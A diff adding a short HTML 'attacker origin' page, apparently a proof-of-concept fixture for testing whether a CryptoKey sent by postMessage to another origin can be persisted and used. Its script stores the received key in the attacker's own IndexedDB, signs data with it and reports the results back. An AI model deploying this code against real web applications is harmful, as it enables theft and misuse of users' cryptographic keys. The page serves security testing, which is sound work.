@@ -1,0 +1,18 @@
+<!doctype html><meta charset="utf-8"><title>attacker</title><body>attacker origin</body>
+<script type="module">
+// attacker origin: receives a CryptoKey by postMessage, stores it in ITS OWN IndexedDB
+const open = () => new Promise((res, rej) => { const q = indexedDB.open('stolen', 1); q.onupgradeneeded = () => q.result.createObjectStore('k'); q.onsuccess = () => res(q.result); q.onerror = () => rej(q.error); });
+addEventListener('message', async (e) => {
+  if (!e.data || e.data.kind !== 'key') return;
+  const out = { origin: location.origin, from: e.origin, gotType: e.data.key && e.data.key.type, extractable: e.data.key && e.data.key.extractable };
+  try {
+    const db = await open();
+    await new Promise((res, rej) => { const tx = db.transaction('k', 'readwrite'); tx.objectStore('k').put(e.data.key, 'victim'); tx.oncomplete = res; tx.onerror = () => rej(tx.error); });
+    out.storedInAttackerIDB = true;
+    const sig = await crypto.subtle.sign({ name: 'ECDSA', hash: 'SHA-256' }, e.data.key, new TextEncoder().encode('signed from attacker origin while victim page open'));
+    out.signedLen = sig.byteLength;
+  } catch (err) { out.err = err.name + ': ' + String(err.message).slice(0, 100); }
+  e.source.postMessage({ kind: 'attacker-result', out }, '*');
+});
+parent.postMessage({ kind: 'attacker-ready' }, '*');
+</script>
